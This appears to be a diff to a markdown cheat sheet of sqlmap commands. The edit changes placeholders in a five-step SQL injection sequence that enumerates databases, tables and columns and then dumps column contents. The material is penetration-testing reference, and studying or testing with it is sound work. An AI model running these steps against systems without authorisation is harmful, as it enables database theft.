@@ -5,27 +5,27 @@
 
 ## basic sqlmap step 1
 ```
-sqlmap -u <url> -p <arguments> --dbs
+sqlmap -u <url> -p <parameter> --dbs
 ```
 
 ## basic sqlmap step 2
 ```
-sqlmap -u <url> -p <arguments> --dbms=<database_type>
+sqlmap -u <url> -p <parameter>
 ```
 
 ## basic sqlmap step 3
 ```
-sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> --tables
+sqlmap -u <url> -p <parameter> -D <database_name> --tables
 ```
 
 ## basic sqlmap step 4
 ```
-sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> --columns
+sqlmap -u <url> -p <parameter> -D <database_name> -T <tables> --columns
 ```
 
 ## basic sqlmap step 5
 ```
-sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> -C <columns> --dump
+sqlmap -u <url> -p <parameter> -D <database_name> -T <tables> -C <columns> --dump
 ```
 
 ## sqlmap - list dbs
